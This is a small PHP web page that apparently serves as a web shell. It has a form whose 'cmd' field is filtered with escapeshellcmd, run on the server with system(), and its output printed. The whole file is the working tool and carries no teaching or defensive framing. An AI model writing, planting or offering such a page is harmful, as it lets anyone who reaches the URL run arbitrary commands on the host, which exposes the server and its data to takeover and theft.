<?php 

if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$cmd = escapeshellcmd($_POST['cmd']);
}

echo '<pre>';
$comando = system($cmd, $retorno);
var_dump($comando);
echo '</pre>';

 ?>

 <form method="post">
 		
	<input type="text" name="cmd">
	<input type="submit" value="enviar">

 </form>